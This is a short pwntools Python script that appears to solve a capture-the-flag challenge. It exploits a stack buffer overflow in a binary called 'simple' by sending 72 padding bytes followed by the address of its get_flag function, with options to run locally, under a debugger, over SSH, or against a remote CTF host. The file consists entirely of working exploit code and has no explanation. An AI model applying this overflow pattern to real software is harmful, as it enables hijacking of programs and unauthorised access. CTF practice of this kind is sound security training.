#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/simple'

e = ELF('./build/simple')
rop = ROP('./build/simple')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('ctf.isss.io', 5000)
elif 's' in sys.argv:
    s = ssh(host='host', user='usersimple', password='password')
    p = s.process('./build/simple', cwd='problemDir')
else:
    p = e.process()

p.sendline(b"A"*72 + p64(e.sym['get_flag']))
p.interactive()
